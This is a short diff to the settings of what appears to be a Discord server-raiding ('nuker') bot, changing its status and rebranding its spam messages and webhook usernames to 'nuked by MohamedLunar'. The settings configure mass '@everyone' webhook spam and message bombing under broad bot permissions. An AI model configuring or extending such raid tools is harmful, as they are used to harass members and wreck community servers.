@@ -68,14 +68,14 @@ settings = {
         "permissions": [],
         "bot_permission": "2146958847",
         "command_prefix": ".",
-        "bot_status": "offline",
+        "bot_status": "dnd",
         "verbose": 15,
         "bomb_messages": {
             "random": 10,
-             "fixed": ["nuked"]
+             "fixed": ["nuked by MohamedLunar"]
          },
         "webhook_spam": {
-            "usernames": ["nuked"],
+            "usernames": ["nuked by MohamedLunar"],
             "pfp_urls": [None],
             "contents": ["@everyone"]
         },
